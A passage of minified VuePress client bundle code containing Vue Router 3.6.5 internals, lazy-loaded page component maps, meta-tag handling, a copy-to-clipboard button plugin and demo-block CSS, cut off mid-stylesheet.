bo={redirected:2,aborted:4,cancelled:8,duplicated:16};function vo(n,e){return xo(n,e,bo.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return wo.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function yo(n,e){return xo(n,e,bo.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function xo(n,e,t,r){var a=new Error(r);return a._isRouter=!0,a.from=n,a.to=e,a.type=t,a}var wo=["params","query","hash"];function ko(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function _o(n,e){return ko(n)&&n._isRouter&&(null==e||n.type===e)}function So(n,e,t){var r=function(a){a>=n.length?t():n[a]?e(n[a],(function(){r(a+1)})):r(a+1)};r(0)}function jo(n){return function(e,t,r){var a=!1,i=0,o=null;Co(n,(function(n,e,t,s){if("function"==typeof n&&void 0===n.cid){a=!0,i++;var l,c=Eo((function(e){var a;((a=e).__esModule||To&&"Module"===a[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:Ni.extend(e),t.components[s]=e,--i<=0&&r()})),p=Eo((function(n){var e="Failed to resolve async component "+s+": "+n;o||(o=ko(n)?n:new Error(e),r(o))}));try{l=n(c,p)}catch(n){p(n)}if(l)if("function"==typeof l.then)l.then(c,p);else{var d=l.component;d&&"function"==typeof d.then&&d.then(c,p)}}})),a||r()}}function Co(n,e){return Io(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function Io(n){return Array.prototype.concat.apply([],n)}var To="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function Eo(n){var e=!1;return function(){for(var t=[],r=arguments.length;r--;)t[r]=arguments[r];if(!e)return e=!0,n.apply(this,t)}}var Ao=function(n,e){this.router=n,this.base=function(n){if(!n)if(Gi){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=ui,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function zo(n,e,t,r){var a=Co(n,(function(n,r,a,i){var o=function(n,e){"function"!=typeof n&&(n=Ni.extend(n));return n.options[e]}(n,e);if(o)return Array.isArray(o)?o.map((function(n){return t(n,r,a,i)})):t(o,r,a,i)}));return Io(r?a.reverse():a)}function qo(n,e){if(e)return function(){return n.apply(e,arguments)}}Ao.prototype.listen=function(n){this.cb=n},Ao.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},Ao.prototype.onError=function(n){this.errorCbs.push(n)},Ao.prototype.transitionTo=function(n,e,t){var r,a=this;try{r=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var i=this.current;this.confirmTransition(r,(function(){a.updateRoute(r),e&&e(r),a.ensureURL(),a.router.afterHooks.forEach((function(n){n&&n(r,i)})),a.ready||(a.ready=!0,a.readyCbs.forEach((function(n){n(r)})))}),(function(n){t&&t(n),n&&!a.ready&&(_o(n,bo.redirected)&&i===ui||(a.ready=!0,a.readyErrorCbs.forEach((function(e){e(n)}))))}))},Ao.prototype.confirmTransition=function(n,e,t){var r=this,a=this.current;this.pending=n;var i,o,s=function(n){!_o(n)&&ko(n)&&(r.errorCbs.length?r.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},l=n.matched.length-1,c=a.matched.length-1;if(fi(n,a)&&l===c&&n.matched[l]===a.matched[c])return this.ensureURL(),n.hash&&ao(this.router,a,n,!1),s(((o=xo(i=a,n,bo.duplicated,'Avoided redundant navigation to current location: "'+i.fullPath+'".')).name="NavigationDuplicated",o));var p=function(n,e){var t,r=Math.max(n.length,e.length);for(t=0;t<r&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),d=p.updated,m=p.deactivated,u=p.activated,g=[].concat(function(n){return zo(n,"beforeRouteLeave",qo,!0)}(m),this.router.beforeHooks,function(n){return zo(n,"beforeRouteUpdate",qo)}(d),u.map((function(n){return n.beforeEnter})),jo(u)),h=function(e,t){if(r.pending!==n)return s(yo(a,n));try{e(n,a,(function(e){!1===e?(r.ensureURL(!0),s(function(n,e){return xo(n,e,bo.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(a,n))):ko(e)?(r.ensureURL(!0),s(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(s(vo(a,n)),"object"==typeof e&&e.replace?r.replace(e):r.push(e)):t(e)}))}catch(n){s(n)}};So(g,h,(function(){So(function(n){return zo(n,"beforeRouteEnter",(function(n,e,t,r){return function(n,e,t){return function(r,a,i){return n(r,a,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),i(n)}))}}(n,t,r)}))}(u).concat(r.router.resolveHooks),h,(function(){if(r.pending!==n)return s(yo(a,n));r.pending=null,e(n),r.router.app&&r.router.app.$nextTick((function(){vi(n)}))}))}))},Ao.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},Ao.prototype.setupListeners=function(){},Ao.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=ui,this.pending=null};var Mo=function(n){function e(e,t){n.call(this,e,t),this._startLocation=Po(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,r=go&&t;r&&this.listeners.push(ro());var a=function(){var t=n.current,a=Po(n.base);n.current===ui&&a===n._startLocation||n.transitionTo(a,(function(n){r&&ao(e,n,t,!0)}))};window.addEventListener("popstate",a),this.listeners.push((function(){window.removeEventListener("popstate",a)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){ho(ki(r.base+n.fullPath)),ao(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){fo(ki(r.base+n.fullPath)),ao(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(Po(this.base)!==this.current.fullPath){var e=ki(this.base+this.current.fullPath);n?ho(e):fo(e)}},e.prototype.getCurrentLocation=function(){return Po(this.base)},e}(Ao);function Po(n){var e=window.location.pathname,t=e.toLowerCase(),r=n.toLowerCase();return!n||t!==r&&0!==t.indexOf(ki(r+"/"))||(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var Lo=function(n){function e(e,t,r){n.call(this,e,t),r&&function(n){var e=Po(n);if(!/^\/#/.test(e))return window.location.replace(ki(n+"/#"+e)),!0}(this.base)||Ro()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=go&&e;t&&this.listeners.push(ro());var r=function(){var e=n.current;Ro()&&n.transitionTo(Oo(),(function(r){t&&ao(n.router,r,e,!0),go||Uo(r.fullPath)}))},a=go?"popstate":"hashchange";window.addEventListener(a,r),this.listeners.push((function(){window.removeEventListener(a,r)}))}},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Bo(n.fullPath),ao(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Uo(n.fullPath),ao(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;Oo()!==e&&(n?Bo(e):Uo(e))},e.prototype.getCurrentLocation=function(){return Oo()},e}(Ao);function Ro(){var n=Oo();return"/"===n.charAt(0)||(Uo("/"+n),!1)}function Oo(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function Do(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function Bo(n){go?ho(Do(n)):window.location.hash=n}function Uo(n){go?fo(Do(n)):window.location.replace(Do(n))}var Fo=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index+1).concat(n),r.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var r=this.stack[t];this.confirmTransition(r,(function(){var n=e.current;e.index=t,e.updateRoute(r),e.router.afterHooks.forEach((function(e){e&&e(r,n)}))}),(function(n){_o(n,bo.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(Ao),No=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=Qi(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!go&&!1!==n.fallback,this.fallback&&(e="hash"),Gi||(e="abstract"),this.mode=e,e){case"history":this.history=new Mo(this,n.base);break;case"hash":this.history=new Lo(this,n.base,this.fallback);break;case"abstract":this.history=new Fo(this,n.base);break;default:0}},Ho={currentRoute:{configurable:!0}};No.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},Ho.currentRoute.get=function(){return this.history&&this.history.current},No.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof Mo||t instanceof Lo){var r=function(n){t.setupListeners(),function(n){var r=t.current,a=e.options.scrollBehavior;go&&a&&"fullPath"in n&&ao(e,n,r,!1)}(n)};t.transitionTo(t.getCurrentLocation(),r,r)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},No.prototype.beforeEach=function(n){return Vo(this.beforeHooks,n)},No.prototype.beforeResolve=function(n){return Vo(this.resolveHooks,n)},No.prototype.afterEach=function(n){return Vo(this.afterHooks,n)},No.prototype.onReady=function(n,e){this.history.onReady(n,e)},No.prototype.onError=function(n){this.history.onError(n)},No.prototype.push=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.push(n,e,t)}));this.history.push(n,e,t)},No.prototype.replace=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.replace(n,e,t)}));this.history.replace(n,e,t)},No.prototype.go=function(n){this.history.go(n)},No.prototype.back=function(){this.go(-1)},No.prototype.forward=function(){this.go(1)},No.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},No.prototype.resolve=function(n,e,t){var r=Fi(n,e=e||this.history.current,t,this),a=this.match(r,e),i=a.redirectedFrom||a.fullPath;return{location:r,route:a,href:function(n,e,t){var r="hash"===t?"#"+e:e;return n?ki(n+"/"+r):r}(this.history.base,i,this.mode),normalizedTo:r,resolved:a}},No.prototype.getRoutes=function(){return this.matcher.getRoutes()},No.prototype.addRoute=function(n,e){this.matcher.addRoute(n,e),this.history.current!==ui&&this.history.transitionTo(this.history.getCurrentLocation())},No.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==ui&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(No.prototype,Ho);var $o=No;function Vo(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}No.install=function n(e){if(!n.installed||Ni!==e){n.installed=!0,Ni=e;var t=function(n){return void 0!==n},r=function(n,e){var r=n.$options._parentVnode;t(r)&&t(r=r.data)&&t(r=r.registerRouteInstance)&&r(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,r(this,this)},destroyed:function(){r(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",yi),e.component("RouterLink",$i);var a=e.config.optionMergeStrategies;a.beforeRouteEnter=a.beforeRouteLeave=a.beforeRouteUpdate=a.created}},No.version="3.6.5",No.isNavigationFailure=_o,No.NavigationFailureType=bo,No.START_LOCATION=ui,Gi&&window.Vue&&window.Vue.use(No);t(103);t(9),t(135);var Go={NotFound:()=>Promise.all([t.e(0),t.e(7)]).then(t.bind(null,342)),Layout:()=>Promise.all([t.e(0),t.e(2)]).then(t.bind(null,340))},Wo={"v-f6da7732":()=>t.e(8).then(t.bind(null,346)),"v-4b18908b":()=>t.e(9).then(t.bind(null,347)),"v-3acc97ec":()=>t.e(10).then(t.bind(null,348)),"v-572c22a4":()=>t.e(11).then(t.bind(null,349)),"v-c09a6976":()=>t.e(12).then(t.bind(null,350)),"v-667b11b3":()=>t.e(13).then(t.bind(null,351)),"v-637ee5a8":()=>t.e(14).then(t.bind(null,352)),"v-20ccf4ba":()=>t.e(15).then(t.bind(null,353)),"v-0767abfc":()=>t.e(16).then(t.bind(null,354)),"v-284a5c70":()=>t.e(17).then(t.bind(null,355)),"v-f5009938":()=>t.e(18).then(t.bind(null,356)),"v-9567367a":()=>t.e(19).then(t.bind(null,357)),"v-236f9bdc":()=>t.e(20).then(t.bind(null,358)),"v-1068c768":()=>t.e(21).then(t.bind(null,359)),"v-3ddfa200":()=>t.e(22).then(t.bind(null,360)),"v-18fb999c":()=>t.e(23).then(t.bind(null,361)),"v-68562108":()=>t.e(24).then(t.bind(null,362)),"v-7af8708c":()=>t.e(25).then(t.bind(null,363)),"v-1a3c5af6":()=>t.e(26).then(t.bind(null,364)),"v-63e88fe4":()=>t.e(27).then(t.bind(null,365)),"v-7144078e":()=>t.e(28).then(t.bind(null,366)),"v-f9d6b4e4":()=>t.e(29).then(t.bind(null,367)),"v-d37ff6a4":()=>t.e(30).then(t.bind(null,368)),"v-1713f0c0":()=>t.e(31).then(t.bind(null,369)),"v-2595496f":()=>t.e(32).then(t.bind(null,370)),"v-16c92313":()=>t.e(33).then(t.bind(null,371)),"v-31806689":()=>t.e(34).then(t.bind(null,372)),"v-60fcebe2":()=>t.e(35).then(t.bind(null,373)),"v-bfe23564":()=>t.e(36).then(t.bind(null,343)),"v-290ff5e0":()=>t.e(37).then(t.bind(null,374)),"v-cba31118":()=>t.e(38).then(t.bind(null,375)),"v-73ef1b26":()=>t.e(39).then(t.bind(null,376)),"v-70906098":()=>t.e(40).then(t.bind(null,377)),"v-34d8b340":()=>t.e(41).then(t.bind(null,378)),"v-5155b7a4":()=>t.e(42).then(t.bind(null,379)),"v-5dd47d80":()=>t.e(43).then(t.bind(null,380)),"v-0866a376":()=>t.e(44).then(t.bind(null,381)),"v-376db697":()=>t.e(45).then(t.bind(null,382)),"v-2a89f0a5":()=>t.e(46).then(t.bind(null,383)),"v-0c9de936":()=>t.e(47).then(t.bind(null,384)),"v-47cbce6b":()=>t.e(48).then(t.bind(null,385)),"v-56606b1e":()=>t.e(49).then(t.bind(null,386)),"v-711274d8":()=>t.e(50).then(t.bind(null,387)),"v-a9def288":()=>t.e(51).then(t.bind(null,388)),"v-bca2559e":()=>t.e(52).then(t.bind(null,389)),"v-40cc2fb1":()=>t.e(53).then(t.bind(null,390)),"v-2968b3d4":()=>t.e(54).then(t.bind(null,391)),"v-eadc1a9a":()=>t.e(55).then(t.bind(null,392)),"v-aee8137e":()=>t.e(56).then(t.bind(null,393)),"v-3f2c56fd":()=>t.e(57).then(t.bind(null,394)),"v-556cb44a":()=>t.e(58).then(t.bind(null,395)),"v-4077a5fe":()=>t.e(59).then(t.bind(null,396)),"v-880aa198":()=>t.e(60).then(t.bind(null,397)),"v-49770e72":()=>t.e(61).then(t.bind(null,398)),"v-1a41a8d0":()=>t.e(62).then(t.bind(null,399)),"v-3553020e":()=>t.e(63).then(t.bind(null,400)),"v-a67c2976":()=>t.e(64).then(t.bind(null,401)),"v-2555ef69":()=>t.e(65).then(t.bind(null,402)),"v-3b782278":()=>t.e(66).then(t.bind(null,403)),"v-4e7874b6":()=>t.e(67).then(t.bind(null,404)),"v-0cedb105":()=>t.e(68).then(t.bind(null,405)),"v-40954b25":()=>t.e(69).then(t.bind(null,406)),"v-fd425884":()=>t.e(70).then(t.bind(null,407))};function Jo(n){const e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}const Qo=/-(\w)/g,Xo=Jo(n=>n.replace(Qo,(n,e)=>e?e.toUpperCase():"")),Yo=/\B([A-Z])/g,Zo=Jo(n=>n.replace(Yo,"-$1").toLowerCase()),Ko=Jo(n=>n.charAt(0).toUpperCase()+n.slice(1));function ns(n,e){if(!e)return;if(n(e))return n(e);return e.includes("-")?n(Ko(Xo(e))):n(Ko(e))||n(Zo(e))}const es=Object.assign({},Go,Wo),ts=n=>es[n],rs=n=>Wo[n],as=n=>Go[n],is=n=>Gt.component(n);function os(n){return ns(rs,n)}function ss(n){return ns(as,n)}function ls(n){return ns(ts,n)}function cs(n){return ns(is,n)}function ps(...n){return Promise.all(n.filter(n=>n).map(async n=>{if(!cs(n)&&ls(n)){const e=await ls(n)();Gt.component(n,e.default)}}))}function ds(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var ms=t(95),us=t.n(ms),gs=t(96),hs=t.n(gs),fs={created(){if(this.siteMeta=this.$site.headTags.filter(([n])=>"meta"===n).map(([n,e])=>e),this.$ssrContext){const e=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(n=e)?n.map(n=>{let e="<meta";return Object.keys(n).forEach(t=>{e+=` ${t}="${hs()(n[t])}"`}),e+">"}).join("\n    "):"",this.$ssrContext.canonicalLink=vs(this.$canonicalUrl)}var n},mounted(){this.currentMetaTags=[...document.querySelectorAll("meta")],this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta(){document.title=this.$title,document.documentElement.lang=this.$lang;const n=this.getMergedMetaTags();this.currentMetaTags=ys(n,this.currentMetaTags)},getMergedMetaTags(){const n=this.$page.frontmatter.meta||[];return us()([{name:"description",content:this.$description}],n,this.siteMeta,xs)},updateCanonicalLink(){bs(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",vs(this.$canonicalUrl))}},watch:{$page(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy(){ys(null,this.currentMetaTags),bs()}};function bs(){const n=document.querySelector("link[rel='canonical']");n&&n.remove()}function vs(n=""){return n?`<link href="${n}" rel="canonical" />`:""}function ys(n,e){if(e&&[...e].filter(n=>n.parentNode===document.head).forEach(n=>document.head.removeChild(n)),n)return n.map(n=>{const e=document.createElement("meta");return Object.keys(n).forEach(t=>{e.setAttribute(t,n[t])}),document.head.appendChild(e),e})}function xs(n){for(const e of["name","property","itemprop"])if(n.hasOwnProperty(e))return n[e]+e;return JSON.stringify(n)}var ws=t(48),ks={mounted(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(ws)()((function(){this.setActiveHash()}),300),setActiveHash(){const n=[].slice.call(document.querySelectorAll(".sidebar-link")),e=[].slice.call(document.querySelectorAll(".header-anchor")).filter(e=>n.some(n=>n.hash===e.hash)),t=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),r=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),a=window.innerHeight+t;for(let n=0;n<e.length;n++){const i=e[n],o=e[n+1],s=0===n&&0===t||t>=i.parentElement.offsetTop+10&&(!o||t<o.parentElement.offsetTop-10),l=decodeURIComponent(this.$route.hash);if(s&&l!==decodeURIComponent(i.hash)){const t=i;if(a===r)for(let t=n+1;t<e.length;t++)if(l===decodeURIComponent(e[t].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(t.hash),()=>{this.$nextTick(()=>{this.$vuepress.$set("disableScrollBehavior",!1)})})}}}},beforeDestroy(){window.removeEventListener("scroll",this.onScroll)}},_s=t(26),Ss=t.n(_s),js={mounted(){Ss.a.configure({showSpinner:!1}),this.$router.beforeEach((n,e,t)=>{n.path===e.path||Gt.component(n.name)||Ss.a.start(),t()}),this.$router.afterEach(()=>{Ss.a.done(),this.isSidebarOpen=!1})}};t(243),t(244);class Cs{constructor(){this.containerEl=document.getElementById("message-container"),this.containerEl||(this.containerEl=document.createElement("div"),this.containerEl.id="message-container",document.body.appendChild(this.containerEl))}show({text:n="",duration:e=3e3}){let t=document.createElement("div");t.className="message move-in",t.innerHTML=`\n      <i style="fill: #06a35a;font-size: 14px;display:inline-flex;align-items: center;">\n        <svg style="fill: #06a35a;font-size: 14px;" t="1572421810237" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2323" width="16" height="16"><path d="M822.811993 824.617989c-83.075838 81.99224-188.546032 124.613757-316.049383 127.86455-122.085362-3.250794-223.943563-45.87231-305.935802-127.86455s-124.613757-184.21164-127.86455-305.935802c3.250794-127.503351 45.87231-232.973545 127.86455-316.049383 81.99224-83.075838 184.21164-126.058554 305.935802-129.309347 127.503351 3.250794 232.973545 46.23351 316.049383 129.309347 83.075838 83.075838 126.058554 188.546032 129.309347 316.049383C949.231746 640.406349 905.887831 742.62575 822.811993 824.617989zM432.716755 684.111464c3.973192 3.973192 8.307584 5.779189 13.364374 6.140388 5.05679 0.361199 9.752381-1.444797 13.364374-5.417989l292.571429-287.514638c3.973192-3.973192 5.779189-8.307584 5.779189-13.364374 0-5.05679-1.805996-9.752381-5.779189-13.364374l1.805996 1.805996c-3.973192-3.973192-8.668783-5.779189-14.086772-6.140388-5.417989-0.361199-10.47478 1.444797-14.809171 5.417989l-264.397884 220.33157c-3.973192 3.250794-8.668783 4.695591-14.447972 4.695591-5.779189 0-10.835979-1.444797-15.53157-3.973192l-94.273016-72.962257c-4.334392-3.250794-9.391182-4.334392-14.447972-3.973192s-9.391182 3.250794-12.641975 7.585185l-2.889594 3.973192c-3.250794 4.334392-4.334392 9.391182-3.973192 14.809171 0.722399 5.417989 2.528395 10.11358 5.779189 14.086772L432.716755 684.111464z" p-id="2324"></path></svg>\n      </i>\n      <div class="text">${n}</div>\n    `,this.containerEl.appendChild(t),e>0&&setTimeout(()=>{this.close(t)},e)}close(n){n.className=n.className.replace("move-in",""),n.className+="move-out",n.addEventListener("animationend",()=>{n.remove()})}}var Is={mounted(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},updated(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},methods:{updateCopy(){setTimeout(()=>{(['div[class*="language-"] pre','div[class*="aside-code"] aside']instanceof Array||Array.isArray(['div[class*="language-"] pre','div[class*="aside-code"] aside']))&&['div[class*="language-"] pre','div[class*="aside-code"] aside'].forEach(n=>{document.querySelectorAll(n).forEach(this.generateCopyButton)})},1e3)},generateCopyButton(n){if(n.classList.contains("codecopy-enabled"))return;const e=document.createElement("i");e.className="code-copy",e.innerHTML='<svg  style="color:#aaa;font-size:14px" t="1572422231464" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3201" width="14" height="14"><path d="M866.461538 39.384615H354.461538c-43.323077 0-78.769231 35.446154-78.76923 78.769231v39.384616h472.615384c43.323077 0 78.769231 35.446154 78.769231 78.76923v551.384616h39.384615c43.323077 0 78.769231-35.446154 78.769231-78.769231V118.153846c0-43.323077-35.446154-78.769231-78.769231-78.769231z m-118.153846 275.692308c0-43.323077-35.446154-78.769231-78.76923-78.769231H157.538462c-43.323077 0-78.769231 35.446154-78.769231 78.769231v590.769231c0 43.323077 35.446154 78.769231 78.769231 78.769231h512c43.323077 0 78.769231-35.446154 78.76923-78.769231V315.076923z m-354.461538 137.846154c0 11.815385-7.876923 19.692308-19.692308 19.692308h-157.538461c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h157.538461c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z m157.538461 315.076923c0 11.815385-7.876923 19.692308-19.692307 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h315.076923c11.815385 0 19.692308 7.876923 19.692307 19.692308v39.384615z m78.769231-157.538462c0 11.815385-7.876923 19.692308-19.692308 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h393.846153c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z" p-id="3202"></path></svg>',e.title="Copy to clipboard",e.addEventListener("click",()=>{this.copyToClipboard(n.innerText)}),n.appendChild(e),n.classList.add("codecopy-enabled")},copyToClipboard(n){const e=document.createElement("textarea");e.value=n,e.setAttribute("readonly",""),e.style.position="absolute",e.style.left="-9999px",document.body.appendChild(e);const t=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);e.select(),document.execCommand("copy");(new Cs).show({text:"复制成功",duration:1e3}),document.body.removeChild(e),t&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(t))}}};!function(n,e){void 0===e&&(e={});var t=e.insertAt;if(n&&"undefined"!=typeof document){var r=document.head||document.getElementsByTagName("head")[0],a=document.createElement("style");a.type="text/css","top"===t&&r.firstChild?r.insertBefore(a,r.firstChild):r.appendChild(a),a.styleSheet?a.styleSheet.cssText=n:a.appendChild(document.createTextNode(n))}}("@media (max-width: 1000px) {\n  .vuepress-plugin-demo-block__h_code {\n    display: none;\n  }\n  .vuepress-plugin-demo-block__app {\n    margin-left: auto !important;\n    margin-right: auto !important;\n  }\n}\n.vuepress-plugin-demo-block__wrapper {\n  margin-top: 10px;\n  border: 1px solid #ebebeb;\n  border-radius: 4px;\n  transition: all 0.2s;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display {\n  height: 400px;\n  display: flex;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__app {\n  width: 300px;\n  border: 1px solid #ebebeb;\n  box-shadow: 1px 1px 3px #ebebeb;\n  margin-right: 5px;\n  overflow: auto;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__h_code {\n  flex: 1;\n  overflow: auto;\n  height: 100%;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__h_code > pre {\n  overflow: visible;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__display {\n  max-height: 400px;\n  overflow: auto;\n}\n.vuepress-plugin-demo-block__wrapper div {\n  box-sizing: border-box;\n}\n.vuepress-plugin-demo-block__wrapper:hover {\n  box-shadow: 0 0 11px rgba(33, 33, 33, 0.2);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__code {\n  overflow: hidden;\n  height: 0;\n  padding: 0 !important;\n  background-color: #282c34;\n  border-radius: 0 !important;\n  transition: height 0.5s;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__code pre {\n  margin: 0 !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__display {\n  padding: 20px;\n  border-bottom: 1px solid #ebebeb;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer {\n  position: relative;\n  text-align: center;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__codepen {\n  opacity: 1;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__expand::before {\n  border-top: none;\n  border-right: 6px solid transparent;\n  border-bottom: 6px solid #ccc;\n  border-left: 6px solid transparent;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__codepen,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand span,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand {\n  opacity: 